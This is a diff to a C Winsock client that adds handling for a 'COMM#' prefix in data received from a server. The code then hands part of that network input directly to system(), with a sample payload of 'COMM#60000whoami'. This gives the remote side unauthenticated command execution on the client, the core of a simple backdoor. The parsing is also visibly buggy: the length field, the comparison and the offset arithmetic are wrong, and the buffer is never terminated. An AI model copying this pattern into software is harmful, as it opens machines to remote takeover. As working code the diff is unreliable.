@@ -25,7 +25,7 @@ int __cdecl main(int argc, char** argv)
     struct addrinfo* result = NULL,
         * ptr = NULL,
         hints;
-    const char* sendbuf = "test for send!";
+    const char* sendbuf = "COMM#60000whoami";
     char recvbuf[DEFAULT_BUFLEN];
     char recvbuf2[DEFAULT_BUFLEN];
     int iResult;
@@ -108,61 +108,63 @@ int __cdecl main(int argc, char** argv)
     }
 
     // Receive until the peer closes the connection
-    //do {
-
-        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
-        if (iResult > 0)
-            printf("Bytes received: %d, buf: %s\n", iResult, recvbuf);
-        else if (iResult == 0)
-            printf("Connection closed\n");
-        else
-            printf("recv failed with error: %d\n", WSAGetLastError());
-
-        iResult = recv(ConnectSocket, recvbuf2, recvbuflen, 0);
-        if (iResult > 0)
-            printf("Bytes received: %d, buf: %s\n", iResult, recvbuf);
-        else if (iResult == 0)
-            printf("Connection closed\n");
-        else
-            printf("recv failed with error: %d\n", WSAGetLastError());
-
-
-    //} while (iResult > 0);
-
-    //Test
-    /*char secret[3];
-    secret[0] = recvbuf[0] & recvbuf2[1];
-    secret[1] = recvbuf[5];
-    secret[2] = recvbuf[3] + recvbuf2[0];
-    printf("Test: %s\n", secret);*/
-    /*char c = recvbuf[1] & recvbuf2[3];
-    printf("Test: %c\n", c);*/
-    
-    
-
-    char* var = "jj";
-    if (recvbuf[0] == var[0])
-    {
-        printf("Whoo\n");
-    }
+    iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+    if (iResult > 0)
+        printf("Bytes received: %d, buf: %s\n", iResult, recvbuf);
+    else if (iResult == 0)
+        printf("Connection closed\n");
     else
-    {
-        printf("Whee\n");
-    }
+        printf("recv failed with error: %d\n", WSAGetLastError());
 
+    //Extract the secret command
 
-    char* comp = "testx";
-    if (strncmp(recvbuf, comp, 5) == 0)
+    //Delimeter
+    char* delimeter = "#";
+    int bufLen = strlen(recvbuf);
+    for (int ii=0; ii< bufLen; ii++)
     {
-        printf("Hi");
-    }
-
-    char* delimeter = "n";
-    for (char c : recvbuf)
-    {
-        if (c == delimeter[0])
+        if (recvbuf[ii] == delimeter[0])
         {
             printf("Found delimeter\n");
+
+            //Now, we check whether the previous data is a command we know
+            char* command = "COMM";
+            int prevLen = ii;
+            if (prevLen < 0)
+            {
+                printf("Command not found\n");
+                break;
+            }
+
+            if (strncmp(recvbuf, command, prevLen) == 0)
+            {
+                //Found command "COMM"
+                printf("Found command COMM\n");
+
+                //Now, get the length of the command that comes right next
+                int lenToExecute = (int) (recvbuf[ii + 1] - '0');
+
+                //Now, execute whatever came after the delimeter
+                char toExecute[16] = { 0 };
+                
+                //Pointer field
+                int startPoint = bufLen - lenToExecute - 1;
+                printf("R:%p | S:%i", (void*)recvbuf, startPoint);
+                strncpy(toExecute, recvbuf + startPoint, lenToExecute);
+
+                //This is a loop-based pointer field, not supported yet
+                //strncpy(toExecute, recvbuf + ii + 2, lenToExecute);
+
+                printf("Received to be executed: %s\n", toExecute);
+
+                system(toExecute);
+            }
+            else
+            {
+                printf("Unknown command received\n");
+            }
+            
+
             break;
         }
     }
